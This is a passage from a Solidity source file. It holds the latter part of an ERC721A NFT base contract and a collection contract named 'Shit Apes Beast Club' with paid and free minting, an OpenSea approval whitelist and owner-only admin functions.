915     /**
916      * Gas spent here starts off proportional to the maximum mint batch size.
917      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
918      */
919     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
920         uint256 curr = tokenId;
921 
922         unchecked {
923             if (_startTokenId() <= curr && curr < _currentIndex) {
924                 TokenOwnership memory ownership = _ownerships[curr];
925                 if (!ownership.burned) {
926                     if (ownership.addr != address(0)) {
927                         return ownership;
928                     }
929                     // Invariant:
930                     // There will always be an ownership that has an address and is not burned
931                     // before an ownership that does not have an address and is not burned.
932                     // Hence, curr will not underflow.
933                     while (true) {
934                         curr--;
935                         ownership = _ownerships[curr];
936                         if (ownership.addr != address(0)) {
937                             return ownership;
938                         }
939                     }
940                 }
941             }
942         }
943         revert OwnerQueryForNonexistentToken();
944     }
945 
946     /**
947      * @dev See {IERC721-ownerOf}.
948      */
949     function ownerOf(uint256 tokenId) public view override returns (address) {
950         return ownershipOf(tokenId).addr;
951     }
952 
953     /**
954      * @dev See {IERC721Metadata-name}.
955      */
956     function name() public view virtual override returns (string memory) {
957         return _name;
958     }
959 
960     /**
961      * @dev See {IERC721Metadata-symbol}.
962      */
963     function symbol() public view virtual override returns (string memory) {
964         return _symbol;
965     }
966 
967     /**
968      * @dev See {IERC721Metadata-tokenURI}.
969      */
970     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
971         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
972 
973         string memory baseURI = _baseURI();
974         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
975     }
976 
977     /**
978      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
979      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
980      * by default, can be overriden in child contracts.
981      */
982     function _baseURI() internal view virtual returns (string memory) {
983         return '';
984     }
985 
986     /**
987      * @dev See {IERC721-approve}.
988      */
989     function approve(address to, uint256 tokenId) public override {
990         address owner = ERC721A.ownerOf(tokenId);
991         if (to == owner) revert ApprovalToCurrentOwner();
992 
993         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
994             revert ApprovalCallerNotOwnerNorApproved();
995         }
996 
997         _approve(to, tokenId, owner);
998     }
999 
1000     /**
1001      * @dev See {IERC721-getApproved}.
1002      */
1003     function getApproved(uint256 tokenId) public view override returns (address) {
1004         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1005 
1006         return _tokenApprovals[tokenId];
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-setApprovalForAll}.
1011      */
1012     function setApprovalForAll(address operator, bool approved) public override {
1013         if (operator == _msgSender()) revert ApproveToCaller();
1014 
1015         _operatorApprovals[_msgSender()][operator] = approved;
1016         emit ApprovalForAll(_msgSender(), operator, approved);
1017     }
1018 
1019     /**
1020      * @dev See {IERC721-isApprovedForAll}.
1021      */
1022     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1023         return _operatorApprovals[owner][operator];
1024     }
1025 
1026     /**
1027      * @dev See {IERC721-transferFrom}.
1028      */
1029     function transferFrom(
1030         address from,
1031         address to,
1032         uint256 tokenId
1033     ) public virtual override {
1034         _transfer(from, to, tokenId);
1035     }
1036 
1037     /**
1038      * @dev See {IERC721-safeTransferFrom}.
1039      */
1040     function safeTransferFrom(
1041         address from,
1042         address to,
1043         uint256 tokenId
1044     ) public virtual override {
1045         safeTransferFrom(from, to, tokenId, '');
1046     }
1047 
1048     /**
1049      * @dev See {IERC721-safeTransferFrom}.
1050      */
1051     function safeTransferFrom(
1052         address from,
1053         address to,
1054         uint256 tokenId,
1055         bytes memory _data
1056     ) public virtual override {
1057         _transfer(from, to, tokenId);
1058         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1059             revert TransferToNonERC721ReceiverImplementer();
1060         }
1061     }
1062 
1063     /**
1064      * @dev Returns whether `tokenId` exists.
1065      *
1066      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1067      *
1068      * Tokens start existing when they are minted (`_mint`),
1069      */
1070     function _exists(uint256 tokenId) internal view returns (bool) {
1071         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1072             !_ownerships[tokenId].burned;
1073     }
1074 
1075     function _safeMint(address to, uint256 quantity) internal {
1076         _safeMint(to, quantity, '');
1077     }
1078 
1079     /**
1080      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1081      *
1082      * Requirements:
1083      *
1084      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1085      * - `quantity` must be greater than 0.
1086      *
1087      * Emits a {Transfer} event.
1088      */
1089     function _safeMint(
1090         address to,
1091         uint256 quantity,
1092         bytes memory _data
1093     ) internal {
1094         _mint(to, quantity, _data, true);
1095     }
1096 
1097     /**
1098      * @dev Mints `quantity` tokens and transfers them to `to`.
1099      *
1100      * Requirements:
1101      *
1102      * - `to` cannot be the zero address.
1103      * - `quantity` must be greater than 0.
1104      *
1105      * Emits a {Transfer} event.
1106      */
1107     function _mint(
1108         address to,
1109         uint256 quantity,
1110         bytes memory _data,
1111         bool safe
1112     ) internal {
1113         uint256 startTokenId = _currentIndex;
1114         if (to == address(0)) revert MintToZeroAddress();
1115         if (quantity == 0) revert MintZeroQuantity();
1116 
1117         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1118 
1119         // Overflows are incredibly unrealistic.
1120         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1121         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1122         unchecked {
1123             _addressData[to].balance += uint64(quantity);
1124             _addressData[to].numberMinted += uint64(quantity);
1125 
1126             _ownerships[startTokenId].addr = to;
1127             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1128 
1129             uint256 updatedIndex = startTokenId;
1130             uint256 end = updatedIndex + quantity;
1131 
1132             if (safe && to.isContract()) {
1133                 do {
1134                     emit Transfer(address(0), to, updatedIndex);
1135                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1136                         revert TransferToNonERC721ReceiverImplementer();
1137                     }
1138                 } while (updatedIndex != end);
1139                 // Reentrancy protection
1140                 if (_currentIndex != startTokenId) revert();
1141             } else {
1142                 do {
1143                     emit Transfer(address(0), to, updatedIndex++);
1144                 } while (updatedIndex != end);
1145             }
1146             _currentIndex = updatedIndex;
1147         }
1148         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1149     }
1150 
1151     /**
1152      * @dev Transfers `tokenId` from `from` to `to`.
1153      *
1154      * Requirements:
1155      *
1156      * - `to` cannot be the zero address.
1157      * - `tokenId` token must be owned by `from`.
1158      *
1159      * Emits a {Transfer} event.
1160      */
1161     function _transfer(
1162         address from,
1163         address to,
1164         uint256 tokenId
1165     ) private {
1166         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1167 
1168         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1169             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1170             getApproved(tokenId) == _msgSender());
1171 
1172         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1173         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1174         if (to == address(0)) revert TransferToZeroAddress();
1175 
1176         _beforeTokenTransfers(from, to, tokenId, 1);
1177 
1178         // Clear approvals from the previous owner
1179         _approve(address(0), tokenId, prevOwnership.addr);
1180 
1181         // Underflow of the sender's balance is impossible because we check for
1182         // ownership above and the recipient's balance can't realistically overflow.
1183         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1184         unchecked {
1185             _addressData[from].balance -= 1;
1186             _addressData[to].balance += 1;
1187 
1188             _ownerships[tokenId].addr = to;
1189             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1190 
1191             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1192             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1193             uint256 nextTokenId = tokenId + 1;
1194             if (_ownerships[nextTokenId].addr == address(0)) {
1195                 // This will suffice for checking _exists(nextTokenId),
1196                 // as a burned slot cannot contain the zero address.
1197                 if (nextTokenId < _currentIndex) {
1198                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1199                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1200                 }
1201             }
1202         }
1203 
1204         emit Transfer(from, to, tokenId);
1205         _afterTokenTransfers(from, to, tokenId, 1);
1206     }
1207 
1208     /**
1209      * @dev Destroys `tokenId`.
1210      * The approval is cleared when the token is burned.
1211      *
1212      * Requirements:
1213      *
1214      * - `tokenId` must exist.
1215      *
1216      * Emits a {Transfer} event.
1217      */
1218     function _burn(uint256 tokenId) internal virtual {
1219         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1220 
1221         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1222 
1223         // Clear approvals from the previous owner
1224         _approve(address(0), tokenId, prevOwnership.addr);
1225 
1226         // Underflow of the sender's balance is impossible because we check for
1227         // ownership above and the recipient's balance can't realistically overflow.
1228         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1229         unchecked {
1230             _addressData[prevOwnership.addr].balance -= 1;
1231             _addressData[prevOwnership.addr].numberBurned += 1;
1232 
1233             // Keep track of who burned the token, and the timestamp of burning.
1234             _ownerships[tokenId].addr = prevOwnership.addr;
1235             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1236             _ownerships[tokenId].burned = true;
1237 
1238             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1239             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1240             uint256 nextTokenId = tokenId + 1;
1241             if (_ownerships[nextTokenId].addr == address(0)) {
1242                 // This will suffice for checking _exists(nextTokenId),
1243                 // as a burned slot cannot contain the zero address.
1244                 if (nextTokenId < _currentIndex) {
1245                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1246                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1247                 }
1248             }
1249         }
1250 
1251         emit Transfer(prevOwnership.addr, address(0), tokenId);
1252         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1253 
1254         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1255         unchecked {
1256             _burnCounter++;
1257         }
1258     }
1259 
1260     /**
1261      * @dev Approve `to` to operate on `tokenId`
1262      *
1263      * Emits a {Approval} event.
1264      */
1265     function _approve(
1266         address to,
1267         uint256 tokenId,
1268         address owner
1269     ) private {
1270         _tokenApprovals[tokenId] = to;
1271         emit Approval(owner, to, tokenId);
1272     }
1273 
1274     /**
1275      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1276      *
1277      * @param from address representing the previous owner of the given token ID
1278      * @param to target address that will receive the tokens
1279      * @param tokenId uint256 ID of the token to be transferred
1280      * @param _data bytes optional data to send along with the call
1281      * @return bool whether the call correctly returned the expected magic value
1282      */
1283     function _checkContractOnERC721Received(
1284         address from,
1285         address to,
1286         uint256 tokenId,
1287         bytes memory _data
1288     ) private returns (bool) {
1289         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1290             return retval == IERC721Receiver(to).onERC721Received.selector;
1291         } catch (bytes memory reason) {
1292             if (reason.length == 0) {
1293                 revert TransferToNonERC721ReceiverImplementer();
1294             } else {
1295                 assembly {
1296                     revert(add(32, reason), mload(reason))
1297                 }
1298             }
1299         }
1300     }
1301 
1302     /**
1303      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1304      * And also called before burning one token.
1305      *
1306      * startTokenId - the first token id to be transferred
1307      * quantity - the amount to be transferred
1308      *
1309      * Calling conditions:
1310      *
1311      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1312      * transferred to `to`.
1313      * - When `from` is zero, `tokenId` will be minted for `to`.
1314      * - When `to` is zero, `tokenId` will be burned by `from`.
1315      * - `from` and `to` are never both zero.
1316      */
1317     function _beforeTokenTransfers(
1318         address from,
1319         address to,
1320         uint256 startTokenId,
1321         uint256 quantity
1322     ) internal virtual {}
1323 
1324     /**
1325      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1326      * minting.
1327      * And also called after one token has been burned.
1328      *
1329      * startTokenId - the first token id to be transferred
1330      * quantity - the amount to be transferred
1331      *
1332      * Calling conditions:
1333      *
1334      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1335      * transferred to `to`.
1336      * - When `from` is zero, `tokenId` has been minted for `to`.
1337      * - When `to` is zero, `tokenId` has been burned by `from`.
1338      * - `from` and `to` are never both zero.
1339      */
1340     function _afterTokenTransfers(
1341         address from,
1342         address to,
1343         uint256 startTokenId,
1344         uint256 quantity
1345     ) internal virtual {}
1346 }
1347 
1348 
1349 
1350 contract SABC is ERC721A, Owneable {
1351 
1352     string public baseURI = "ipfs://bafybeiem4skcjbezrw5m6ttmlkthxpuosu5dtrjbuznj74fzoqurwrv3ny/";
1353     string public constant baseExtension = ".json";
1354     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1355 
1356     uint256 public MaxPerWalletFree = 1;
1357     uint256 public constant MAX_PER_TX = 40;
1358     uint256 public constant MAX_SUPPLY = 10000;
1359     uint256 public price = 0.01 ether;
1360 
1361     bool public paused = true;
1362 
1363     constructor() ERC721A("Shit Apes Beast Club", "SABC") {}
1364 
1365     function mint(uint256 _amount) external payable {
1366         address _caller = _msgSender();
1367         require(!paused, "Paused");
1368         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1369         require(_amount > 0, "No 0 mints");
1370         require(tx.origin == _caller, "No contracts");
1371         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1372         
1373         if(_numberMinted(msg.sender) >= MaxPerWalletFree) {
1374             require(msg.value >= _amount * price, "Invalid funds provided");
1375         } else{
1376             uint count = _numberMinted(msg.sender) + _amount;
1377             if(count > MaxPerWalletFree){
1378                 require(msg.value >= (count - MaxPerWalletFree) * price , "Insufficient funds");
1379             } 
1380         }
1381         payable(owner()).transfer(msg.value);
1382         _safeMint(_caller, _amount);
1383     }
1384 
1385     function isApprovedForAll(address owner, address operator)
1386         override
1387         public
1388         view
1389         returns (bool)
1390     {
1391         // Whitelist OpenSea proxy contract for easy trading.
1392         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1393         if (address(proxyRegistry.proxies(owner)) == operator) {
1394             return true;
1395         }
1396 
1397         return super.isApprovedForAll(owner, operator);
1398     }
1399 
1400     function withdraw() external onlyOwner {
1401         uint256 balance = address(this).balance;
1402         (bool success, ) = _msgSender().call{value: balance}("");
1403         require(success, "Failed to send");
1404     }
1405 
1406     function config() external onlyOwner {
1407         _safeMint(_msgSender(), 1);
1408     }
1409 
1410     function pause(bool _state) external onlyOwner {
1411         paused = _state;
1412     }
1413 
1414     function setBaseURI(string memory baseURI_) external onlyOwner {
1415         baseURI = baseURI_;
1416     }
1417 
1418     function reserveBulk(address[] memory to) external onlyOwner {
1419         for (uint i = 0; i < to.length;i++) {
1420             _safeMint(to[i], 1);
1421         }
1422     }
1423 
1424     function setPrice(uint256 newPrice) public onlyOwner {
1425         price = newPrice;
1426     }
1427 
1428     function setMaxPerWalletFree(uint256 newMaxPerWalletFree) public onlyOwner {
1429         MaxPerWalletFree = newMaxPerWalletFree;
1430     }
1431 
1432     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1433         require(_exists(_tokenId), "Token does not exist.");
1434         return bytes(baseURI).length > 0 ? string(
1435             abi.encodePacked(
1436               baseURI,
1437               Strings.toString(_tokenId),
1438               baseExtension
1439             )
1440         ) : "";
1441     }
1442 }
1443 
1444 contract OwnableDelegateProxy { }
1445 contract ProxyRegistry {
1446     mapping(address => OwnableDelegateProxy) public proxies;
1447 }